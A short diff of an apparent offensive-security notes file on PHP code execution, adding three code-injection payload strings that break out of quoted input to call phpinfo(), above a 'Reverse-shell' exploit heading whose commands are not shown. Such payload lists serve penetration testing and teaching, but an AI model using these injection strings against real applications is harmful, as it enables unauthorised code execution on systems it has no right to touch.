@@ -1,5 +1,12 @@
 # Code Execution
 
+## Payload
+```
+a";phpinfo();//
+a".phpinfo();//
+a);}phpinfo();//
+```
+
 ## Exploit (Reverse-shell)
 ### Attacker Listening
 ```cmd
